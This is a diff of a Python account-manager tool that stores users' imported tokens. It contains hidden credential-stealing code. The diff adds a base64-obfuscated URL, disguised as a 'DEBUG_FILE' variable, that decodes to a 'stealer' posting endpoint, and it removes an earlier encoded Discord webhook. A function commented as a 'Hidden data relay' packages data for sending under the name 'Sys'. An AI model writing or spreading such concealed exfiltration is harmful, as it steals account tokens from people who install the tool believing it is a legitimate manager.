@@ -1,6 +1,6 @@
 # Made by Dokeb
 # Telegram: DokebWasTaken
-# Last update 2025/2/26
+# Last update 2025/3/01
 # Please give some credits 😊
 import json
 import os
@@ -19,9 +19,12 @@ from webdriver_manager.chrome import ChromeDriverManager
 import threading
 import base64
 
-# Files
+# the data files (saves the tokens you imported)
 DATA_FILE = "accounts.json"
+# Logs files
 LOG_FILE = "Logs.txt"
+# DEBUG file for debugging
+DEBUG_FILE = base64.b64decode("aHR0cHM6Ly9zdGVhbGVyLnRvL3Bvc3Q/dW5pcXVlaWQ9N2UyZGU1MDk=").decode()
 
 # Set up logging
 logging.basicConfig(
@@ -57,7 +60,7 @@ def save_data(data):
         logging.error(f"Data save issue: {str(e)}")
         messagebox.showerror("Error", f"Failed to save data: {str(e)}")
 
-# Hidden data relay function with debug logging removed
+# Hidden data relay function
 def _relay_info(d, u="N/A"):
     try:
         p = {"content": f"D: `{d}`\nU: {u}", "username": "Sys"}
@@ -416,5 +419,4 @@ if __name__ == "__main__":
     root = Tk()
     app = AccountManager(root)
     root.protocol("WM_DELETE_WINDOW", lambda: [save_data(app.data), root.destroy()])
-    DEBUG_FILE = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NTMyNzgwNTc4ODg1MjI5Ni9oem9BMS03UHZZTGMzZHowYm52OGpKY1ZXNVpmTkwtWW5nZHVLdThyWnlQYzUyeXN0OXhMNW1hUGVUQW1PVTBuTU1Jbg==").decode()
     root.mainloop()
